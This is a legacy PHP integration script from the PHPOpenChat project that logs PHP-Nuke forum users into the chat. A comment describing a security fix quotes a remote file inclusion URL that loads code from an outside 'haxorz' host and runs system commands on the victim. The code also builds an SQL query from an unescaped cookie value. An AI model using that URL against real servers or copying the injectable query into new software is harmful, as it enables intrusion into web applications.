<?php //-*-php-*-
/*   ********************************************************************   **
**   Copyright notice                                                       **
**                                                                          **
**   (c) 1995-2004 PHPOpenChat Development Team                             **
**   http://phpopenchat.sourceforge.net/                                    **
**                                                                          **
**   All rights reserved                                                    **
**                                                                          **
**   This script is part of the PHPOpenChat project. The PHPOpenChat        **
**   project is free software; you can redistribute it and/or modify        **
**   it under the terms of the GNU General Public License as published by   **
**   the Free Software Foundation; either version 2 of the License, or      **
**   (at your option) any later version.                                    **
**                                                                          **
**   The GNU General Public License can be found at                         **
**   http://www.gnu.org/copyleft/gpl.html.                                  **
**   A copy is found in the textfile GPL and important notices to the       **
**   license from the team is found in the textfile LICENSE distributed     **
**   with these scripts.                                                    **
**                                                                          **
**   This script is distributed in the hope that it will be useful,         **
**   but WITHOUT ANY WARRANTY; without even the implied warranty of         **
**   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the          **
**   GNU General Public License for more details.                           **
**                                                                          **
**   This copyright notice MUST APPEAR in all copies of the script!         **
**   ********************************************************************   */

/*
  $Author: letreo $
  $Date: 2004/05/08 18:53:00 $
  $Source: /cvsroot/phpopenchat/chat3/contrib/phpnuke/Attic/ENGLISH_poc.php,v $
  $Revision: 1.1.2.2 $
*/
//quick security fix
//'cause, if register_globals=on and allow_url_fopen=on
//the following is possible:
//http://www.victime.al/phpopenchat/contrib/phpbb/poc.php?phpbb_root_path=http://www.haxorz.al/asc?&cmd=uname%20-a;w;id;pwd;ps
//thx to the Albania Security Clan (Mafia_Boy) 
//for finding the bug and bringing us to the light!
if( !function_exists('version_compare') || version_compare(PHP_VERSION, "4.1.0", "<") )
  die('please update your php installation');

$givenParams = array_keys($_REQUEST);
foreach($givenParams as $param )
  unset(${$param});

//NOTE: This script is programmed by DJ_pandur2000 an member of our german support forum at
//<http://www.phpopenchat.de/>
//If you have any question don't hesitate to contact
//DJ_Pandur2000 <pandur@pandur2000.com> <http://pandur2000.com/>

include("header.php");
OpenTable(); $index=0;


//PHPOpenChat properties
/*
supposition is, you have installed phpnuke and PHPOpenChat within the document root
of your webserver side by side.

<http://your.host.tld>
                      |
                      +</nuke>
                      |
                      +</phpopenchat>
*/

$poc_doc_root  = '/phpopenchat';
$poc_root_path = './../phpopenchat';

// Scripteinstellungen // Scriptsettings

$dbhost = "localhost";         // 'localhost' or 'www.yoursiteurl.com' if on a remote site
$dbuser = "root";           // username
$dbpwd = "";            // password
$dbname = "";       // the name of your database


$mysqlconnect = @mysql_connect($dbhost,$dbuser,$dbpwd);

$channelname = ''; //Channel to be joined

$deftheme = 'openchat'; // POC default Theme -- POC Standard Theme
$siteurl = 'http://www.yourdomain.tld'; // Deine Domain URL -- Your Domain URL -- without ending  "/"
$nuke_prefix = 'nuke_'; // Prefix of phpnuke tables // Prefix der PHPnuke Tabellen.. Meist "nuke_"
$nukeordner = '/';
// Der Ordnername in dem phpnuke ist // Foldername of phpNuke
// Wenn phpnuke in keinem seperaten Ordner liegt, sondern im Stammverzeichnis, lösche das "/".
// If phpNuke is in the root, delete the "/".

// User oder Gast? -- User or Guest?


if ($cookie[1] == "") {

// Wenn Gastbenutzer, dann gebe folgenden Inhalt aus (anpassen bitte)
// If Guest, output the following and exit (please, edit ;) )

echo"<table class='fonts' width='100%' border='0' cellspacing='0' cellpadding='0'>
  <tr>
    <td><p><font size='2' face='Georgia, Times New Roman, Times, serif'><strong><font face='Verdana, Arial, Helvetica, sans-serif'>Hello Guest!</font></strong> </font></p>
        <p><font size='2' face='Verdana, Arial, Helvetica, sans-serif'> If you want to chat as guest, please click the \"Guest-Chat\" button. <br>
        To enter the chat without any username/password dialogue, it would be better so registrate yourself with our portal. <br>
       </font><br>

</p>
        <center>

<form action='".$siteurl.$poc_doc_root."/index.php' method='get'>
  <div align=\'center\'>
    <input type='submit' name='Submit' value='Guest-Chat'>
  </div>
</form>
<form action='".$siteurl.$nukeordner."/modules.php' method='get'>
  <div align=\'center\'>
    <input type='submit' name='Submit' value='registration'>
	<input type='hidden' value='profile' name='file'>
	<input type='hidden' value='register' name='mode'>
  		<input type='hidden' value='Forums' name='name'>
</div>
</form>

</center>
          <br>
    </td>
  </tr>
</table>";


exit;
}


if ($cookie[1] != "") {
    $sql2 = "SELECT * FROM ".$nuke_prefix."users WHERE user_id='$cookie[0]'";
    $con2 = mysql_db_query($dbname,$sql2,$mysqlconnect);
    $list2 = mysql_fetch_assoc($con2);

$userid = $cookie[0];




$username = $list2["username"];

if( $username != 'Anonymous' ){
  require_once($poc_root_path.'/config.inc.php');
  require_once(POC_INCLUDE_PATH.'/class.Chatter.inc');
  require_once(POC_INCLUDE_PATH.'/adodb/adodb.inc.php');

  $chatter = &new POC_Chatter();
  $chatter->set_nick($list2[username]);

  $current_chatter = $chatter;//save current

  $chatter->set_user($list2[username]);
  $chatter->set_email($list2[user_email]); //is hidden by default
  $chatter->set_name($list2['name']);
  $chatter->set_homePageURL($list2[user_website]);
  $chatter->set_icqNumber($list2[user_icq]);
 // $chatter->set_motto($list2[12]);
  $chatter->set_aimNickname($list2[user_aim]);
  $chatter->set_yimNickname($list2[user_yim]);
  $chatter->set_interests($list2[user_interests]);
  if( !empty($list2[user_gender]) ) $gender = ($list2[user_gender]=='1')? 'm':'f';
  $chatter->set_gender($gender);
  unset($gender);
  $chatter->set_birthday($list2[user_age]);

  $chatter->set_theme( '$deftheme' );//use default theme of PHPOpenChat

  if( $list2[user_rank] == '1' ){
    $chatter->add_to_group('operator');
  }

  if( !empty($list2[user_lang]) ){
    $chatter->set_preferred_language($list2[user_lang]);
  }

  //do not send registration mails
  $chatter->set_skip_email();

  if( $current_chatter != $chatter ){
    if( !$chatter->is_registered()) {
      $chatter->register();
    } else {
      $chatter->update();
    }
  }
  unset($current_chatter);

  $chatter->mkinstance_persist();
  unset($chatter);


  header('Status: 301');
  header('Location: '.$siteurl.''.$poc_doc_root.'/index.php?use_db_instance='. $username .'&channel='.$channelname.'');
  exit;
}else{
  die('No guest login possible to the chat!');
}

}
CloseTable();
include("footer.php");

?>